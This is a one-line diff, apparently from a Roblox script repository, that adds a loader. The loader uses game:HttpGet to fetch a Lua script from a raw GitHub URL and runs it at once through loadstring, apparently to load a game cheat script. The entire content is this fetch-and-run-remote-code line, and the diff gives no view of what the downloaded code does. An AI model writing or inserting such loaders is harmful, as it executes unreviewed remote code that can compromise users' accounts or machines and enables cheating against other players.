@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/cook-the-chicken-by-slapping-it-spam7-3mqzsytqo2g3ry.lua"))()
